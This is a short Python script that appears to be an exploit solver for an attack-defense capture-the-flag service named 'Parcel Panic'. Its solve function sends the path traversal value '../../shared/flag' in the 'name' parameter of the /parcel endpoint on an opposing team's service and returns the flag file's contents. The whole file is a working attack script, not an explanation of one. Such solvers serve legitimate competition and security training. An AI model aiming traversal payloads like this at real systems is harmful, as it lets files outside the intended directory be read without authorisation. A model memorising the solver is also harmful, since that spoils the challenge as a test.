#!/usr/bin/env python3
"""Read the rotating BYOC flag through Parcel Panic's traversal."""

import argparse
import re
from urllib.parse import urlencode
from urllib.request import Request, urlopen


FLAG_PATTERN = re.compile(r"flag\{[A-Za-z0-9_-]{32}\}")
MAX_RESPONSE_BYTES = 1024
TIMEOUT_SECONDS = 4


def solve(url: str) -> str:
    """Perform the player-visible traversal and return the current flag."""
    query = urlencode({"name": "../../shared/flag"})
    request = Request(
        f"{url.rstrip('/')}/parcel?{query}",
        headers={"Accept-Encoding": "identity", "Connection": "close"},
    )
    with urlopen(request, timeout=TIMEOUT_SECONDS) as response:
        body = response.read(MAX_RESPONSE_BYTES + 1)
    if len(body) > MAX_RESPONSE_BYTES:
        raise RuntimeError("service returned an oversized response")
    try:
        flag = body.decode("utf-8").strip()
    except UnicodeDecodeError as error:
        raise RuntimeError("service response was not UTF-8") from error
    if FLAG_PATTERN.fullmatch(flag) is None:
        raise RuntimeError("service response did not contain an A&D flag")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="opposing Parcel Panic service URL")
    args = parser.parse_args()
    print(solve(args.url))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
